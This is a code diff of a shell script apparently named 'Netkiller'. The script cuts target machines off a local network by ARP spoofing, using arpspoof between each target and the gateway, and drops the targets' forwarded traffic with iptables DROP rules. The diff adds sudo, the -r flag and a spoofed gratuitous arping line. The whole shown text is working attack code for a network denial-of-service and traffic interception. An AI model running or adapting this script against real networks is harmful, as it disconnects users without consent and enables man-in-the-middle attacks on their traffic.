@@ -107,10 +107,11 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 # Run arpspoof for each target IP
 for TARGET_IP in "${TARGET_IPS[@]}"; do
     echo "Netkiller attacking the IP => $TARGET_IP"
-    iptables -I FORWARD -s $TARGET_IP -j DROP
-    iptables -I FORWARD -d $TARGET_IP -j DROP
-    arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
-    arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
+    sudo iptables -I FORWARD -s $TARGET_IP -j DROP
+    sudo iptables -I FORWARD -d $TARGET_IP -j DROP
+    sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 &
+    sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET_IP" >/dev/null 2>&1 &
+    sudo arping -b -A -i "$INTERFACE" -S "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
 done
 
 echo " "
